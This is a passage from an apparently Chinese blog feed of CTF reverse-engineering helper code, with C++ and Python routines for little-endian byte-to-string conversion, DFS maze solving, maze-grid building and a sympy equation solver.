class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer<span class="token punctuation">[</span>buffer_length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将十进制数sum逆向存储到 buffer[]</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="小端序-int-型-逆向-string-型字符串"><a href="#小端序-int-型-逆向-string-型字符串" class="headerlink" title="小端序 int 型 - 逆向 string 型字符串"></a>小端序 int 型 - 逆向 string 型字符串</h2><h3 id="C-版-2"><a href="#C-版-2" class="headerlink" title="C++版"></a>C++版</h3><ul><li><p><strong>特点</strong></p><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 string字符串 buffer 中</li><li><mark>若 num 位数超长，将类型改为 <strong>int64</strong></mark></li></ol></li><li><p>参数：</p></li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr><tr><td><code>buffer_length</code></td><td>字符串 <code>buffer</code> 的长度，可根据 <code>width_num / 2</code> 得出</td></tr></tbody></table><ul><li><p><strong>头文件</strong></p><ol><li><code>#include &lt;sstream&gt;</code></li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">string <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    string buffer <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> width_num<span class="token punctuation">;</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将2长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer <span class="token operator">+=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将字符sum逆向存储到 buffer字符串</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="Python版-1"><a href="#Python版-1" class="headerlink" title="Python版"></a>Python版</h3><ul><li><p><strong>特点</strong></p><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 string字符串 buffer 中</li></ol></li><li><p>参数：</p></li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将int数据转换为十六进制的字符串  </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">!=</span> width_num <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>          hex_str <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>width_num <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 位数不足width的用0凑齐  </span>    <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 用于存放生成的字符串  </span>    index <span class="token operator">=</span> width_num      <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 每两位string转换为十六进制int型数据  </span>        <span class="token builtin">buffer</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 将int型作为char存入s  </span>        index <span class="token operator">-=</span> <span class="token number">2</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span></code></pre><hr><h2 id="走迷宫"><a href="#走迷宫" class="headerlink" title="走迷宫"></a>走迷宫</h2><h3 id="Python版-2"><a href="#Python版-2" class="headerlink" title="Python版"></a>Python版</h3><ul><li><p><strong>特点</strong></p><ol><li>给出迷宫，起始位置和终点位置，输出走迷宫的路径</li><li>迷宫中 0 代表路，1 代表墙壁</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    usedmap <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment">## 生成与迷宫相同规格的全0列表，用来记录已经走过的位置  </span>  sti <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 初始位置的横坐标  </span>stj <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 初始位置的纵坐标  </span>edi <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment">## 终点位置的横坐标  </span>edj <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment">## 终点位置的纵坐标  </span>flag <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">## 走迷宫  </span>    <span class="token keyword">global</span> flag      <span class="token keyword">if</span> x <span class="token operator">==</span> edi <span class="token keyword">and</span> y <span class="token operator">==</span> edj<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">return</span>      <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往下走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'s'</span>  <span class="token comment">## 向下走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往上走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'w'</span>  <span class="token comment">## 向上走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往右走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'d'</span>  <span class="token comment">## 向右走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往左走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'a'</span>  <span class="token comment">## 向左走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    dfs<span class="token punctuation">(</span>sti<span class="token punctuation">,</span> stj<span class="token punctuation">)</span></code></pre><hr><h2 id="生成迷宫"><a href="#生成迷宫" class="headerlink" title="生成迷宫"></a>生成迷宫</h2><h3 id="Python版-3"><a href="#Python版-3" class="headerlink" title="Python版"></a>Python版</h3><ul><li><p><strong>特点</strong></p><ol><li><em>用于辅助走迷宫脚本</em>，快速生成迷宫的二维列表形式的数据</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存放生成的迷宫，是一个二维列表</span>maze_line <span class="token operator">=</span> <span class="token number">16</span>  <span class="token comment"># 迷宫的行数</span>maze_column <span class="token operator">=</span> <span class="token number">16</span>  <span class="token comment"># 迷宫的列数</span><span class="token comment"># 迷宫数据</span>maze_str <span class="token operator">=</span> <span class="token string">"1111111111111111100000111111011110111011111101111011101100010111101110110101011110111000010101111011111101010111101111110001011110111111101101111011111110110111100001100001000111110111101101011111011110110101100001111011010010111111100001111011111111111111"</span>  <span class="token comment"># maze_tmp 用来暂存每一行的迷宫数据，一维列表</span>maze_tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> i <span class="token operator">%</span> maze_column <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        maze<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maze_tmp<span class="token punctuation">)</span>  <span class="token comment"># 每 maze_column 个数据作为一组，加入 maze</span>        maze_tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 一组加入完后，需要将 maze_tmp 置空，用于存放下一组数据</span>    maze_tmp <span class="token operator">+=</span> maze_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>maze_str<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 最后一行数据，直接加入maze即可</span>        maze<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maze_tmp<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>maze_line<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 输出迷宫</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><hr><h2 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h2><h3 id="Python版-4"><a href="#Python版-4" class="headerlink" title="Python版"></a>Python版</h3><ul><li><p><strong>特点</strong></p><ol><li>可求解 n 元 n 次方程组</li><li>无法判断无解的情况（会取近似值），但是可以从解出来的结果判断是否无解（无解的情况解出来的值是很长很长的不循环小数）</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 创建未知数  </span>v<span class="token punctuation">,</span> w<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">'v w x y z'</span><span class="token punctuation">)</span>  <span class="token comment"># 定义方程组  </span>eq1 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">23</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">32</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">98</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">55</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">333322</span><span class="token punctuation">)</span>  eq2 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">123</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">322</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">68</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">67</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">707724</span><span class="token punctuation">)</span>  eq3 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">266</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">34</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">43</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">1272529</span><span class="token punctuation">)</span>  eq4 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">343</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">352</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">65</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1672457</span><span class="token punctuation">)</span>  eq5 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">231</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">321</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">938</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">555</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">970</span><span class="token punctuation">,</span> <span class="token number">3372367</span><span class="token punctuation">)</span>  <span class="token comment"># 解方程组  </span>sol <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">(</span>eq1<span class="token punctuation">,</span> eq2<span class="token punctuation">,</span> eq3<span class="token punctuation">,</span> eq4<span class="token punctuation">,</span> eq5<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v<span class="token punctuation">,</span> w<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打印解  </span><span class="token keyword">print</span><span class="token punctuation">(</span>sol<span class="token punctuation">)</span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 便捷算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
